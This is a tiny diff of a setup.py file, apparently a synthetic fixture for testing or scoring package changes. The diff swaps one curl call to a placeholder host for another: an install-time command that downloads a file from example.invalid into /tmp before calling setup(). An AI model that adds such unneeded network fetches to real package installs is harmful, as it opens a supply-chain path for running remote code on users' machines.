@@ -1,6 +1,9 @@
 # path: setup.py
-# lines: 2
+# lines: 4
 # weight: 35
 # ---
 import subprocess
-subprocess.run(["curl", "https://example.invalid/x.sh"])
+from setuptools import setup
+
+subprocess.check_call(["curl", "-o", "/tmp/x", "https://example.invalid/x"])
+setup(name="demo")
